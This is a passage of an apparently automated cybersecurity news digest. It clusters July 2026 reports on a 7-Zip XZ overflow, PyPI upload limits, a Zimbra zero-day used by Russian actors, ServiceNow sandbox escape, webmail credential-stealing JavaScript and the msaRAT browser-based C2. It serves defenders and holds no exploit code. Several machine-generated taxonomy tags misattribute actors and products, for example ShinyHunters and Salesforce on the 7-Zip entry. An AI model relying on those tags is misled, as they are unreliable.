Tweet  Share  Share  Share SHARE  Cybercrime , endpoint security , enterprise security , network security , ransomware , VPN Security , Vulnerability , Windows Security ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Through One Email Microsoft Maps Three Salesforce Attack Paths Tied to a Year of ShinyHunters Activity OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials 11 Old Microsoft-Signed Linux UEFI Shims Could Let Attackers Bypass Secure Boot Researchers Say Claude for Chrome Flaw Lets Rogue Extensions Trigger Gmail Reads Microsoft Patches Record 622 Flaws, Including Two Zero-Days Under Active Attack Cursor Flaw Lets Malicious Cloned Repositories Trigger Windows Code Execution Researcher Drops New Windows Zero-Day PoC Hours After Microsoft
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Qilin Ransomware Attackers Exploit PAN-OS Authentication Bypass for Initial Access
  - Published: 2026-07-21T14:04:57+00:00
  - Link: https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html
  - Summary: Threat actors have been observed exploiting a now-patched high-severity Palo Alto Networks PAN-OS vulnerability as an entry point to deploy Qilin (aka Agenda) ransomware on victim environments. Arctic Wolf Labs said it investigated multiple intrusions in June 2026 that began with the exploitation of CVE-2026-0257 (CVSS score: 7.8), an authentication bypass flaw affecting the portal and gateway

### Cluster 629e6024b5 — score 14

- Title: New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-20T09:10:56+00:00
- Link: https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-14266

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, zero_day
- actor_attribution: ShinyHunters
- affected_products: Microsoft 365, Microsoft Entra, Salesforce
- cve_ids: CVE-2026-14266, CVE-2026-48095
- urgency_signals: actively_exploited, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, active_exploitation
- actor_attribution: ShinyHunters
- affected_products: Salesforce, Microsoft Entra, Microsoft 365
- cve_ids: CVE-2026-14266, CVE-2026-48095
- urgency_signals: actively_exploited, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266, is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02. The overflow lets an attacker "execute code in the context of the current process," per the
```

#### Full body

```
New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction  Swati Khandelwal  Jul 20, 2026 Vulnerability / Endpoint Security Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266 , is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02 . The overflow lets an attacker "execute code in the context of the current process," per the advisory. The code runs with the token 7-Zip itself holds and gains no privileges of its own. On Windows, a normally launched 7-Zip runs under a filtered standard-user token even on an administrator account, so the attacker inherits those limited rights unless the program was started elevated. The bug came in from Landon Peng of Lunbun LLC, who reported it to 7-Zip on June 5. ZDI rates the flaw 7.0, or High, not the Critical several write-ups reached for. The full CVSS 3.0 vector is AV:L/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H . The AV:L makes it a local attack vector, not a network-reachable or no-click one. ZDI's "remote code execution" describes a remote attacker delivering the file, which the victim still has to open, whether it arrives by email, a download, or a web page that hands it to 7-Zip. The high attack complexity makes reliable exploitation harder still. As of July 20, 2026, The Hacker News found no public proof-of-concept for the bug and no credible report of exploitation in the wild. The Hacker News compared the XZ decoder source across releases. The fix lands in one function, MixCoder_Code in C/XzDec.c . When an XZ stream runs its output through a filter, the decoder was handed the full output-buffer length on each pass instead of the space left after earlier writes. That gave it more room to work with than the buffer held, the out-of-bounds write condition ZDI describes. Version 26.02 subtracts the bytes already written and bails out if that running total ever exceeds the buffer. The same flawed length handling appears unchanged in 7-Zip source back to at least version 21.07 (2021), though neither ZDI nor 7-Zip has said which releases are actually exploitable. CVE-2026-14266 is the latest in a run of memory-safety bugs in 7-Zip's archive handlers. On April 27, version 26.01 fixed a batch of them , including the higher-scored CVE-2026-48095 , an NTFS-handler heap-write overflow that GitHub Security Lab detailed on May 22 with a working proof-of-concept. The XZ flaw is the quieter of the two so far, and 26.02 rolls up every one of these fixes, so one update covers them all. So update to 7-Zip 26.02 or later on every machine that opens archives from outside. Updating is a manual install from the official site, so set-and-forget machines will not pick it up on their own. Any product that ships a vulnerable copy of 7-Zip's XZ decoder needs its own vendor fix. The patch went out 20 days before the advisory, so anyone who updated in late June was covered before the details were public. For once, updating gets you ahead of the problem instead of chasing it. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Application Security , Code Execution , endpoint security , Patch Management , Software Security , Vulnerability , Windows ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Through One Email Microsoft Maps Three Salesforce Attack Paths Tied to a Year of ShinyHunters Activity OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials 11 Old Micr
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: New 7-Zip Vulnerability Could Let Crafted XZ Archives Run Code During Extraction
  - Published: 2026-07-20T09:10:56+00:00
  - Link: https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html
  - Summary: Opening a crafted XZ archive in 7-Zip could let an attacker run code on the machine. The flaw, CVE-2026-14266, is a heap-based buffer overflow in how the archiver processes XZ chunked data, and Trend Micro's Zero Day Initiative (ZDI) detailed it on July 15. A fix shipped on June 25 in 7-Zip 26.02. The overflow lets an attacker "execute code in the context of the current process," per the

### Cluster d8d22ce90d — score 14

- Title: Quoting Seth Larson
- Source: Simon Willison (ai_security_agentic_risk)
- Published: 2026-07-23T04:50:36+00:00
- Link: https://simonwillison.net/2026/Jul/23/seth-larson/#atom-everything
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: PyPI

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- affected_products: OpenAI/ChatGPT, PyPI
- content_type: news_report
- confidence_tier: tier_2_operator, tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain
- affected_products: PyPI, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Tags: packaging , python , supply-chain , pypi , seth-michael-larson
```

#### Full body

```
Simon Willison’s Weblog Subscribe Sponsored by: Atlassian — Give your agents a plan. Not a prompt. New Jira capabilities unlock full-context for AI-native software development. Assign tasks to Claude, Cursor, or GitHub Copilot, now directly from Jira. Learn more 23rd July 2026 The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Posted 23rd July 2026 at 4:50 am Recent articles OpenAI’s accidental cyberattack against Hugging Face is science fiction that happened - 22nd July 2026 A Fireside Chat with Cat and Thariq from the Claude Code team - 21st July 2026 Kimi K3, and what we can still learn from the pelican benchmark - 16th July 2026 This is a quotation collected by Simon Willison, posted on 23rd July 2026 . packaging 51 pypi 49 python 1,267 supply-chain 20 seth-michael-larson 6 Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026
```

#### Corroborating sources (2)

- **Simon Willison** (ai_security_agentic_risk)
  - Title: Quoting Seth Larson
  - Published: 2026-07-23T04:50:36+00:00
  - Link: https://simonwillison.net/2026/Jul/23/seth-larson/#atom-everything
  - Summary: The Python Package Index (PyPI) now rejects new files being uploaded to releases that are older than 14 days. This restriction was put in place to prevent old and long-stable releases from being poisoned in case publishing tokens or workflows of PyPI projects were compromised. As far as we are aware this has not yet been abused, but there is no technical reason beyond that attackers weren't aware it was possible. — Seth Larson , PyPI blog Tags: packaging , python , supply-chain , pypi , seth-michael-larson
- **Help Net Security** (cyber_news_breach_reporting)
  - Title: PyPI hardens package security with new upload restrictions
  - Published: 2026-07-23T09:31:19+00:00
  - Link: https://www.helpnetsecurity.com/2026/07/23/pypi-secures-package-releases/
  - Summary: The Python Package Index (PyPI) now rejects uploads of new files to releases older than 14 days to prevent attackers from poisoning long-stable releases if a project’s publishing tokens or release workflows are compromised. “This change will protect Python users and reduce the amount of “cleanup” work associated with project compromises for PyPI admins. This restriction also means that compromises don’t put releases into an indeterminate and confusing state of both “compromised” and “not compromised”, … More → The post PyPI hardens package security with new upload restrictions appeared first on Help Net Security .

### Cluster 332f35118d — score 13

- Title: Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-07-23T21:23:18+00:00
- Link: https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, ransomware_extortion, zero_day
- actor_attribution: APT28
- affected_industries: financial_services, government
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, apt_espionage
- actor_attribution: APT28
- affected_industries: financial_services, government
- cve_ids: CVE-2025-66376
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A state-sponsored threat group, dubbed "Laundry Bear," sends "half-click" phishing emails that require a victim only to open or preview the message.
```

#### Full body

```
Cyberattacks & Data Breaches Cyber Risk Application Security Vulnerabilities & Threats News Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets A state-sponsored threat group, dubbed "Laundry Bear," sends "half-click" phishing emails that require a victim only to open or preview the message. Rob Wright , Senior News Director , Dark Reading July 23, 2026 4 Min Read Source: Anton Petrus via Getty Images Russian state-backed threat actors are compromising networks of Western governments and enterprises through the Zimbra Collaboration Suite (ZCS), according to intelligence and cybersecurity agencies in more than a dozen countries. In a joint advisory Thursday, the US government and several allied nations warned that an advanced persistent threat (APT) dubbed "Laundry Bear" has been targeting ZCS customers since July 2025. Laundry Bear actors used a zero-day vulnerability in ZCS , tracked as CVE-2025-66376, in a phishing campaign that featured what experts describe as a "half-click exploit" to breach Zimbra webmail servers. "Unlike traditional phishing campaigns that persuade a user into taking an action, such as clicking a link or opening a file, Laundry Bear’s latest campaign leverages a view-based exploit that only requires a user to view a malicious email within a vulnerable version of the webmail service," the agencies said in the advisory. Related: Brazilian Banking Trojan Actively Spreading in Portugal The campaign is designed "almost certainly to gather sensitive information for the Russian Federation," according the advisory. The Laundry Bear attacks mark yet another threat from Russian APTs against US organizations. Zimbra Zero-Day Activity Zimbra patched CVE-2025-66376 in November 2025 with the release of version 10.1.13, though the company did not disclose the flaw until weeks later. The initial release notes for v10.1.13 merely described the flaw as "a stored XSS vulnerability in the Classic UI where attackers could abuse CSS @import directives in email HTML," with no CVE at the time. The National Institute of Standards and Technology (NIST) and Mitre did not publish entries for the Zimbra flaw until early January. Dark Reading contacted Zimbra and parent company Synacor for comment on the apparent delayed disclosure for CVE-2025-66376, but neither company responded at press time. In a March 17 blog post , cybersecurity firm Seqrite reported that Russian threat actors had exploited CVE-2025-66376 in the compromise of a Ukrainian government agency. At the time, Seqrite attributed the activity, which it called "Operation GhostMail," to APT28, also known as Fancy Bear . The following day, the US Cybersecurity and Infrastructure Security Agency (CISA) added the high-severity vulnerability to its Known Exploited Vulnerabilities (KEV) catalog on March 18. Mitre also gave the vulnerability a 7.2 CVSS score. However, intelligence and cybersecurity agencies from 15 different countries revealed the exploitation activity was far more extensive and dated back to at least July 2025. They also tied the phishing campaign to a different Russian "Bear." Related: Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain Laundry Bear's 'Half-Click' Zimbra Exploit According to the joint advisory, the Netherlands General Intelligence and Security Service (AIVD) first identified Laundry Bear in May as a new Russian state-sponsored APT adjacent to other more well-known groups. Laundry Bear, the authoring agencies said, had previously relied on unsophisticated tactics such as password spraying and conventional phishing attacks until last year, when actors began using a "novel exploit" for CVE-2025-66376 that no longer required targeted victims to click on a link or open a malicious email attachment. In a blog post on Thursday, Proofpoint, which contributed to the government investigations into Laundry Bear, explained that the Zimbra vulnerability allowed the threat actors to craft "half-click" phishing emails that only nee
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Russian Hackers Exploit Zimbra Zero-Day Against US, Ukraine Targets
  - Published: 2026-07-23T21:23:18+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/russian-hackers-zimbra-zero-day-us-ukraine-targets
  - Summary: A state-sponsored threat group, dubbed "Laundry Bear," sends "half-click" phishing emails that require a victim only to open or preview the message.

### Cluster afe64cb742 — score 12

- Title: Email threat landscape: Q2 2026 trends and insights
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-07-23T15:00:00+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, mfa_bypass, phishing_social_eng
- affected_products: Microsoft Defender
- content_type: intel_roundup
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, credential_theft, mfa_bypass
- affected_products: Microsoft Defender
- content_type: intel_roundup
- confidence_tier: tier_1_primary_research

#### Summary

```
In the second quarter of 2026, the continuing effects of Microsoft’s disruption of the Tycoon2FA phishing platform contributed to sustained declines in several major phishing techniques, while threat actors expanded into Teams-based social engineering and employed increasingly automated and multi-stage attack chains. The post Email threat landscape: Q2 2026 trends and insights appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Adversary-in-the-middle (AiTM) Credential theft Phishing Social engineering Threats intelligence Business email compromise Cybercrime Social engineering and phishing Content types Research Products and services Microsoft Defender Microsoft Defender for Endpoint Microsoft Defender for Office 365 Topics Actionable threat insights Threat intelligence The second quarter of 2026 (April–June) was largely defined by the continuing downstream effects following Microsoft’s Digital Crimes Unit-led disruption efforts against the Tycoon2FA phishing-as-a-service (PhaaS) platform in March. Phishing volume linked to the platform fell 92% from pre-disruption averages, including QR code phishing and CAPTCHA-gated phishing both declining from their March highs. Despite ongoing efforts to rebuild operations, Tycoon2FA did not recover its previous scale or influence during Q2, and no single service emerged to replace the platform at comparable scale. Inside tycoon2fa Infrastructure, tradecraft, and detections › These trends reflect both the measurable impact that disruption operations can have on phishing ecosystems and the adaptability of threat actors as they diversify delivery channels. At the same time, Microsoft Threat Intelligence observed continued growth in Teams-based social engineering, particularly voice phishing (vishing), with weekly malicious call attempts reaching nearly ten times the mid-2025 baseline by the end of the quarter. This activity illustrates how threat actors continue to expand beyond email into trusted workplace communication platforms where communications may appear more trustworthy to users. Microsoft detected approximately 7.6 billion email-based phishing threats throughout the quarter, with monthly volumes declining modestly from 2.7 billion in April to 2.4 billion in June. Credential phishing remained the dominant objective behind malicious payloads, while business email compromise (BEC) activity largely returned to historical norms after a brief, anomalous surge in April. Notable campaigns observed during the quarter also demonstrated how threat actors combine automation, trusted services, and multi-stage delivery chains to scale operations. These campaigns ranged from an automated BEC campaign that reached more than 67,000 users across 42,000 organizations in under three hours, to a multi-stage phishing campaign that used nested EML files, calendar invitations, and a Microsoft authentication redirect to deliver malware. Q2 AiTM token compromise April phishing campaign tactics, detections, and mitigations › This blog provides a view of email threat activity across the second quarter of 2026, highlighting key trends in phishing techniques, payload delivery, and threat actor behavior observed by Microsoft Threat Intelligence. We examine shifts in QR code and CAPTCHA-gated phishing activity, malicious payload trends, BEC activity, the growth of Teams-based threats, and notable campaigns observed during the quarter. We also provide recommendations and Microsoft Defender detections to help organizations identify and mitigate evolving threats while prioritizing defensive measures. Tycoon2FA Q2 disruption impact The disruption operation that Microsoft’s Digital Crimes Unit launched against Tycoon2FA infrastructure in early March continued to produce measurable results throughout Q2 2026. After falling 15% in March and another 22% in April, Tycoon2FA-linked phishing volume dropped 74% in May to just 1.5 million messages, then fell another 20% in June to 1.2 million, by far the lowest monthly volumes observed in at least a year. For reference, the average monthly volume of phishing messages linked to Tycoon2FA during the second half of 2025 was 15.1 million. By the end of Q2, volumes were running at roughly 8% of that baseline, representing a 92% total decline since the disruption operation began. email threat landscape Q1 trends that shaped Q2 activity › Figure 1. Tycoon2FA monthly m
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Email threat landscape: Q2 2026 trends and insights
  - Published: 2026-07-23T15:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/
  - Summary: In the second quarter of 2026, the continuing effects of Microsoft’s disruption of the Tycoon2FA phishing platform contributed to sustained declines in several major phishing techniques, while threat actors expanded into Teams-based social engineering and employed increasingly automated and multi-stage attack chains. The post Email threat landscape: Q2 2026 trends and insights appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Email threat landscape: Q2 2026 trends and insights
  - Published: 2026-07-23T15:00:00+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/07/23/email-threat-landscape-q2-2026-trends-and-insights/
  - Summary: In the second quarter of 2026, the continuing effects of Microsoft’s disruption of the Tycoon2FA phishing platform contributed to sustained declines in several major phishing techniques, while threat actors expanded into Teams-based social engineering and employed increasingly automated and multi-stage attack chains. The post Email threat landscape: Q2 2026 trends and insights appeared first on Microsoft Security Blog .

### Cluster b788e3a84d — score 12

- Title: Critical ServiceNow AI Platform Flaw Exploited for Unauthenticated Code Execution
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-07-21T06:29:26+00:00
- Link: https://thehackernews.com/2026/07/critical-servicenow-ai-platform-flaw.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-6875

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, zero_day
- actor_attribution: ShinyHunters
- affected_products: Microsoft 365, Microsoft Entra, Salesforce
- cve_ids: CVE-2026-6875
- urgency_signals: no_patch_yet, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, active_exploitation
- actor_attribution: ShinyHunters
- affected_products: Salesforce, Microsoft Entra, Microsoft 365
- cve_ids: CVE-2026-6875
- urgency_signals: zero_day, preauth_unauth, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Threat actors are now exploiting a recently disclosed critical security flaw impacting ServiceNow AI Platform, according to Defused Cyber. In a post shared on X, the threat intelligence firm said it's observing in-the-wild exploitation of CVE-2026-6875 (CVSS score: 9.5), a sandbox escape vulnerability that could allow an unauthenticated user to run arbitrary code. Patches for the flaw were
```

#### Full body

```
Critical ServiceNow AI Platform Flaw Exploited for Unauthenticated Code Execution  Ravie Lakshmanan  Jul 21, 2026 Vulnerability / Artificial Intelligence Threat actors are now exploiting a recently disclosed critical security flaw impacting ServiceNow AI Platform, according to Defused Cyber . In a post shared on X, the threat intelligence firm said it's observing in-the-wild exploitation of CVE-2026-6875 (CVSS score: 9.5), a sandbox escape vulnerability that could allow an unauthenticated user to run arbitrary code. Patches for the flaw were released by ServiceNow throughout June in the following versions - Brazil EA and Brazil GA Australia Patch 2 Zurich Patch 7b and Zurich Patch 9 Yokohama Patch 12 Hot Fix 1b and Yokohama Patch 13 Searchlight Cyber, which disclosed additional technical specifics, said it reported the issue on April 1, 2026, adding it allows a complete compromise of the ServiceNow instance as well as all connected proxy servers. Besides rolling out a fix, ServiceNow is "enhancing instance security by severely restricting the type of code that can run in sandbox contexts," security researcher Adam Kues noted . Defused initially noted that the exploitation efforts target the same pre-authentication endpoint ("/assessment_thanks.do") using HTTP POST requests, although the sandbox-escape gadget leads to the same code execution primitive by a different route documented in the proof-of-concept (PoC) exploit. However, in a subsequent post, Defused issued a correction, stating the captured payload in fact matches that of Searchlight Cyber's PoC. In light of active exploitation, customers of self-hosted versions are advised to apply the fixes, if not already, to counter the threat. Update Following the publication of the story, a ServiceNow spokesperson told The Hacker News that there has been no exploitation observed to date. "ServiceNow is aware of a cybersecurity company's recent publication regarding exploitation activity associated with a previously disclosed security vulnerability, identified as CVE-2026-6875," the spokesperson noted. "Based on our investigation to date, we have not observed evidence that this activity is related to instances that ServiceNow hosts." "We have provided updates and patches designed to address this issue, and we encourage our self-hosted and ServiceNow-hosted customers to apply the relevant patches if they have not already done so. In addition, we will continue to work directly with customers who need assistance in applying the patches." (The story was updated after publication to include a response from ServiceNow.) Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  Application Security , artificial intelligence , Cloud security , enterprise security , Vulnerability ⚡ Top Stories This Week URGENT - Progress Tells ShareFile Customers to Shut Down Storage Zone Controllers Over Security Threat Misconfigured Server Reveals Three Evilginx Phishing Operations Targeting Microsoft 365 Meta Files Patent for AI That Can Listen All Day and Track How You're Feeling New MemGhost Attack Plants Persistent False Memories in AI Agents Through One Email Microsoft Maps Three Salesforce Attack Paths Tied to a Year of ShinyHunters Activity OAuth Client ID Spoofing Lets Attackers Validate Stolen Microsoft Entra Credentials 11 Old Microsoft-Signed Linux UEFI Shims Could Let Attackers Bypass Secure Boot Researchers Say Claude for Chrome Flaw Lets Rogue Extensions Trigger Gmail Reads Microsoft Patches Record 622 Flaws, Including Two Zero-Days Under Active Attack Cursor Flaw Lets Malicious Cloned Repositories Trigger Windows Code Execution Researcher Drops New Windows Zero-Day PoC Hours After Microsoft Patch Tuesday TuxBot v3 Evolution Shows Signs of LLM-Assisted IoT Botnet Development Unpatched Shark Vacuum Flaw Could Let Attackers Control Other Vacuums Region-Wide New Agent Data Inj
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Critical ServiceNow AI Platform Flaw Exploited for Unauthenticated Code Execution
  - Published: 2026-07-21T06:29:26+00:00
  - Link: https://thehackernews.com/2026/07/critical-servicenow-ai-platform-flaw.html
  - Summary: Threat actors are now exploiting a recently disclosed critical security flaw impacting ServiceNow AI Platform, according to Defused Cyber. In a post shared on X, the threat intelligence firm said it's observing in-the-wild exploitation of CVE-2026-6875 (CVSS score: 9.5), a sandbox escape vulnerability that could allow an unauthenticated user to run arbitrary code. Patches for the flaw were

### Cluster 1ff0bf04bf — score 11

- Title: Russian Global Webmail Espionage
- Source: Unit 42 (threat_research_primary)
- Published: 2026-07-23T14:10:53+00:00
- Link: https://unit42.paloaltonetworks.com/russian-webmail-espionage/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng
- affected_industries: financial_services, government
- affected_products: Palo Alto Networks
- cve_ids: CVE-2025-66376
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, apt_espionage
- affected_industries: financial_services, government
- affected_products: Palo Alto Networks
- cve_ids: CVE-2025-66376
- urgency_signals: no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Unit 42 details a Russian cyberespionage campaign targeting Zimbra webmail servers using JavaScript injection to steal credentials. The post Russian Global Webmail Espionage appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Threat Research Cybercrime Cybercrime Russian Global Webmail Espionage 3 min read Related Products Advanced DNS Security Advanced URL Filtering Cloud-Delivered Security Services Cortex Unit 42 Incident Response By: Unit 42 Published: July 23, 2026 Categories: Cybercrime Threat Research Tags: CL-STA-1114 JavaScript Javascript injection Nation-state Obfuscation Phishing Zimbra webmail Share Executive Summary Unit 42 has observed a persistent cyberespionage campaign we track as CL-STA-1114. This activity cluster overlaps with activity from a Russian threat actor tracked by other vendors as Void Blizzard and LAUNDRY BEAR. The attackers behind this campaign targeted Zimbra webmail in organizations in the following sectors: Governments Defense Transportation Financial organizations across the following regions: NATO member states Ukraine Commonwealth of Independent States (CIS) countries Africa Unique to this campaign, the group leveraged zero-click phishing emails that exploit a vulnerability in the Zimbra Collaboration Suite (ZCS) webmail platform (CVE-2025-66376). The exploit automatically injects a malicious JavaScript payload without requiring recipient interaction. Once executed, the payload exfiltrates sensitive user data, including login credentials, email archives, and search histories. Threat actors continue to actively target unpatched ZCS instances using CVE-2025-66376. Palo Alto Networks customers are better protected from the threats discussed above through the following products: Cortex Advanced Email Security Advanced URL Filtering and Advanced DNS Security If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics Cyberespionage , Phishing , Data Exfiltration Technical Analysis The attackers behind CL-STA-1114 have been active since at least 2024 , and this campaign targeting Zimbra servers started in July 2025. Initial access starts with a phishing email that contains either an HTML attachment or embedded HTML in the message text. This lure is designed to catch recipients' attention with news headlines. Figure 1 shows an example of the lure used and a snippet of the underlying HTML code. Figure 1. Example lure and a snippet of its underlying HTML content. The HTML text contains an obfuscated division with a Base64-encoded script (highlighted in red in Figure 1). The obfuscated section creates an invisible Scalable Vector Graphics (SVG) element that, upon loading, decodes the Base64-encoded script into a JavaScript payload that it injects into the victim’s browser. When executed, this JavaScript exfiltrates the victim’s Zimbra webmail data to a hard-coded command and control (C2) server. Exfiltrated data includes: CSRF tokens Email address and password Two-factor authentication (2FA) scratch codes System and environment details The victim’s last 90 days of email and search history Over the course of this campaign, we observed minimal changes to the JavaScript payload. Figure 2 illustrates the attack chain. Figure 2. The attack chain. Since we began tracking this campaign, there have been at least nine IP addresses and nine domains for the C2 servers. These servers were active for an average of 35.4 days. See the Indicators of Compromise (IoC) section for a list of the IP addresses and domains used in CL-STA-1114 activity. Conclusion This campaign activity in CL-STA-1114 illustrates the persistent and evolving threat of state-sponsored cyberespionage. The attacker behind this activity targets widely used mail platforms like Zimbra, posing a risk to critical industries globally. This research highlights the need for vigilance, proactive patching and advanced threat detection to protect organizations. Network administrators, defenders and security researchers should patch vulnerable systems and use the IoCs below to investigate and strengthen defenses against CL-STA-1114 and similar activity. Palo Alto Networks custom
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Russian Global Webmail Espionage
  - Published: 2026-07-23T14:10:53+00:00
  - Link: https://unit42.paloaltonetworks.com/russian-webmail-espionage/
  - Summary: Unit 42 details a Russian cyberespionage campaign targeting Zimbra webmail servers using JavaScript injection to steal credentials. The post Russian Global Webmail Espionage appeared first on Unit 42 .

### Cluster a1940e8772 — score 11

- Title: Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-07-23T10:00:38+00:00
- Link: https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, phishing_social_eng, ransomware_extortion
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, data_breach
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
The Chaos ransomware group uses new malware "msaRAT" that hijacks browsers. The malware doesn't communicate directly with C2 but connects through the browser. It enables arbitrary command execution while hiding the attacker's IP from victims via WebRTC over TURN.
```

#### Full body

```
Chaos ransomware's msaRAT: Living off the browser to build a covert C2 channel By Jordyn Dunk , Michael Szeliga , Takahiro Takeda Thursday, July 23, 2026 06:00 ransomware RAT Cisco Talos has discovered a new Rust-based remote access trojan (RAT) we call “msaRAT” attributed to the Chaos ransomware group. The name is derived from the binding names found in the binary: “msaOpen,” “msaClose,” “msaError,” and “msaMessage”. msaRAT is implemented using the Tokio asynchronous runtime, with primary capabilities of browser-leveraged remote code execution and covert tunneling to establish command-and-control (C2) communications. This RAT never touches the network directly — it controls its C2 communication channel exclusively through Chrome DevTools Protocol (CDP), a browser debugging API. The binary contains a Cloudflare Workers endpoint, but it never makes HTTP connections to that domain itself; it offloads that work entirely to the browser. msaRAT manipulates the browser via CDP, performs signaling (SDP Offer/Answer exchange) with Cloudflare Workers, and establishes a WebRTC DataChannel between the browser and the C2 server using Twilio TURN (Traversal Using Relays around NAT) as a relay. Overview of Chaos ransomware Chaos is a ransomware-as-a-service (RaaS) group whose activity was first confirmed in 